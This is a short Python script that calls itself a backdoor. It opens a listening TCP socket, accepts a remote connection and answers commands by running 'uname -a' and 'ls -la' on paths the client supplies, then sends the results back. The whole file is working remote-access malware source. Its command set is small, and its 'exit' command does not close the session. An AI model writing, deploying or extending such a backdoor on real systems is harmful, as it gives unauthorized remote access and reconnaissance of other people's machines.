#!/usr/bin/python3

import socket
import subprocess


def main():
	serv_ip = input("Enter IP address of the server: ")
	serv_port = int(input("Enter port of the server: "))
	connection(serv_ip, serv_port)

def connection(serv_ip, serv_port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.bind((serv_ip,serv_port))
	s.listen(1)
	print("Backdoor Started")

	connection, address = s.accept()

	usage = "COMMANDS:\n\tsys-info\n\tdir\n\texit\n"
	usage = bytes(usage, 'utf-8')
	connection.sendall(usage)

	while 1:
		command = connection.recv(1024)
		if not command: break
		
		command = command.decode('utf-8')
		command = command.split()

		# Closing the connection
		if (command[0] == 'exit'):
			continue
		elif (command[0] == 'sys-info'):
			command_results = subprocess.run(['uname','-a'], capture_output=True)
			command_results = command_results.stdout
			connection.sendall(command_results)
		elif (command[0] == 'dir'):
			command_results = subprocess.run(['ls','-la',command[1]], capture_output=True)
			command_results = command_results.stdout
			connection.sendall(command_results)
		else:
			connection.sendall(b'Unknown Command\n')

	connection.close()


if __name__ == "__main__":
	main()